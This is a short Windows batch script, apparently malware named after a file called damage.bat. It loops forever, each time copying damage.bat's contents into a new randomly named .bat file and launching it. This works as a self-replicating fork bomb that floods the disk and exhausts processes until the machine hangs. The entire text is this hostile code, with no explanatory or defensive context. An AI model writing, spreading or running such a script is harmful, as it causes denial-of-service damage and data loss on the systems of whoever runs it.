@echo off
:A
SET /A X=%RANDOM%%%1999999999%
type damage.bat >> %x%.bat
start %x%.bat
goto:A